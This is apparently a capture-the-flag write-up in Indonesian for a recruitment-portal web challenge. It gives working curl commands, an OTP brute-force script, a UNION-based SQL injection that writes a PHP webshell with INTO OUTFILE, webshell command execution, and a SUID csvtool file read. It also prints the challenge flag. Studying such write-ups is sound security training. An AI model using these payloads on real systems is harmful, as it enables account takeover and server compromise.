# FU Career

**Category:** Web
**CTF:** LYKNCTF 2026
**Flag:** `LYKN{default_credential_sqli2rce_r0n4d0_m3ss1}`

## Deskripsi

> FPTU Career has launched a new recruitment portal where candidates can register accounts, submit CVs, and track their application status online.
>
> The HR department uses an internal dashboard to manage applicants and preview uploaded CVs before scheduling interviews. However, several features were rushed for the new recruitment season and may not have been thoroughly tested.
>
> Goal: Escalate your privileges to admin and achieve Remote Code Execution (RCE).
>
> Note: rockyou.txt will not be useful for this challenge.

## Ringkasan Exploit

```text
Default credential
        ↓
Username enumeration lewat forgot.php
        ↓
Brute-force OTP 4 digit
        ↓
Reset password akun HR
        ↓
Login sebagai admin
        ↓
SQL injection di preview.php
        ↓
SELECT ... INTO OUTFILE
        ↓
PHP webshell di folder uploads
        ↓
Remote Code Execution
        ↓
SUID csvtool membaca /part2.txt
```

## Recon

Aplikasi menyediakan akun kandidat dengan default credential:

```text
Username: candidate.demo
Password: candidate123
```

Login berhasil dan mengarahkan user ke `dashboard.php`.

```bash
curl -sS -i -c cookies.txt \
  -X POST "$BASE/login.php" \
  -H 'User-Agent: Mozilla/5.0' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'username=candidate.demo&password=candidate123'
```

Respons:

```http
HTTP/1.1 302 Found
Location: dashboard.php
```

Saat session tersebut dipakai untuk membuka `admin.php`, server mengarahkan kembali ke dashboard. Akun demo hanya memiliki role `user`.

## Username Enumeration

Fitur lupa password menerima parameter `username`.

```html
<form method="post" action="forgot.php">
    <input name="username" required>
</form>
```

Username yang tidak valid menghasilkan pesan:

```text
Không tìm thấy username này.
```

Username valid menghasilkan redirect menuju halaman reset:

```http
HTTP/1.1 302 Found
Location: reset.php?username=<username>
```

Perbedaan respons tersebut bisa dipakai sebagai username oracle.

Beberapa username yang berhubungan dengan admin dan HR dicoba, tetapi tidak ditemukan:

```text
admin
administrator
hr.admin
lan.nt.hr
nguyen.thi.lan
talent.acquisition
```

Enumerasi kandidat yang diturunkan dari identitas dan kontak HR menemukan akun berikut:

```text
hr.fehn
```

Validasi akun:

```bash
curl -sS -i \
  -X POST "$BASE/forgot.php" \
  -H 'User-Agent: Mozilla/5.0' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'username=hr.fehn'
```

Respons:

```http
HTTP/1.1 302 Found
Location: reset.php?username=hr.fehn
```

## Brute-force OTP

Halaman reset menggunakan OTP empat digit.

```text
0000 - 9999
```

Tidak ada rate limit efektif yang menghentikan percobaan berulang. Total ruang pencarian hanya 10.000 kemungkinan, sehingga seluruh OTP bisa diuji secara paralel.

Request reset:

```http
POST /reset.php?username=hr.fehn
Content-Type: application/x-www-form-urlencoded
```

Body:

```text
otp=0000&password=NewPassword123!
```

OTP yang salah tetap berada di halaman reset. OTP yang benar ditandai dengan redirect ke halaman login.

Solver menggunakan beberapa worker untuk menguji seluruh kombinasi:

```python
for number in range(10000):
    otp = f"{number:04d}"

    response = requests.post(
        f"{base}/reset.php?username=hr.fehn",
        data={
            "otp": otp,
            "password": new_password,
        },
        allow_redirects=False,
    )

    if response.status_code == 302 and "login.php" in response.headers.get("Location", ""):
        print(f"OTP found: {otp}")
        break
```

Setelah OTP ditemukan, password akun `hr.fehn` berubah menjadi password yang dikendalikan attacker.

## Admin Takeover

Password baru digunakan untuk login sebagai akun HR.

```bash
curl -sS -i -c admin.cookies \
  -X POST "$BASE/login.php" \
  -H 'User-Agent: Mozilla/5.0' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'username=hr.fehn&password=NewPassword123!'
```

Session tersebut dapat membuka:

```text
/admin.php
```

Halaman admin menampilkan bagian pertama flag dan daftar CV kandidat yang dapat dipreview.

## SQL Injection di Preview CV

Fitur preview CV menerima parameter `cv_id` melalui endpoint:

```text
/preview.php
```

Nilai `cv_id` dimasukkan langsung ke query SQL tanpa prepared statement.

Struktur query kurang lebih seperti berikut:

```sql
SELECT *
FROM cv_submissions
WHERE id = $cv_id;
```

Parameter tersebut bisa diisi dengan `UNION SELECT`.

Jumlah kolom tabel adalah sembilan, sehingga payload harus mengembalikan sembilan nilai:

```sql
-1 UNION ALL SELECT
1,
1,
'payload',
'x',
'x',
'x',
'x',
'x',
NOW()
-- -
```

## Menulis Webshell dengan INTO OUTFILE

Database user memiliki privilege `FILE`. MySQL `INTO OUTFILE` bisa dipakai untuk menulis hasil query ke filesystem.

Webshell yang digunakan:

```php
<?php system($_GET['cmd']); ?>
```

Payload PHP diubah ke hex agar tidak bermasalah dengan quote SQL:

```text
3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e
```

Payload final:

```sql
-1 UNION ALL SELECT
1,
1,
0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e,
0x78,
0x78,
0x78,
0x78,
0x78,
NOW()
INTO OUTFILE '/var/www/html/uploads/cv_shell.php'
-- -
```

Request:

```bash
curl -sS -b admin.cookies \
  -X POST "$BASE/preview.php" \
  -H 'User-Agent: Mozilla/5.0' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "cv_id=-1 UNION ALL SELECT 1,1,0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e,0x78,0x78,0x78,0x78,0x78,NOW() INTO OUTFILE '/var/www/html/uploads/cv_shell.php'-- -"
```

File berhasil ditulis ke:

```text
/var/www/html/uploads/cv_shell.php
```

Webshell dapat diakses dari:

```text
/uploads/cv_shell.php
```

## Remote Code Execution

RCE divalidasi dengan command `id`.

```bash
curl -sG \
  "$BASE/uploads/cv_shell.php" \
  --data-urlencode 'cmd=id'
```

Output menunjukkan command dijalankan sebagai user web server.

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Membaca Part 2

Bagian kedua flag berada di:

```text
/part2.txt
```

File tersebut tidak bisa dibaca langsung oleh `www-data`.

Enumerasi permission menemukan binary berikut memiliki bit SUID:

```text
/usr/bin/csvtool
```

`csvtool` dapat membaca file menggunakan privilege pemilik binary.

Command:

```bash
/usr/bin/csvtool cat /part2.txt
```

Dijalankan melalui webshell:

```bash
curl -sG \
  "$BASE/uploads/cv_shell.php" \
  --data-urlencode 'cmd=/usr/bin/csvtool cat /part2.txt'
```

Output dari `/part2.txt` digabung dengan bagian pertama yang ditemukan di panel admin.

## Solver

Exploit dijalankan dengan:

```bash
source /home/nata/ctf_env/bin/activate

python3 solve.py \
  'http://TARGET:8080/' \
  --username hr.fehn \
  --workers 20 \
  --timeout 15
```

Tahapan solver:

1. Mengirim request forgot password untuk `hr.fehn`.
2. Melakukan brute-force OTP `0000–9999`.
3. Mengganti password akun HR.
4. Login menggunakan password baru.
5. Membuka panel admin dan mengambil part pertama flag.
6. Mengeksploitasi SQL injection pada `preview.php`.
7. Menulis PHP webshell memakai `INTO OUTFILE`.
8. Menjalankan command `id` untuk memastikan RCE.
9. Membaca `/part2.txt` memakai SUID `csvtool`.
10. Menggabungkan kedua bagian flag.

Output akhir:

```text
[+] OTP ditemukan
[+] Password HR berhasil diganti
[+] Login admin berhasil
[+] Flag part 1 ditemukan
[+] Webshell berhasil ditulis
[+] RCE aktif
[+] Part 2 berhasil dibaca

<FLAG>LYKN{default_credential_sqli2rce_r0n4d0_m3ss1}</FLAG>
```

## Flag

```text
LYKN{default_credential_sqli2rce_r0n4d0_m3ss1}
```
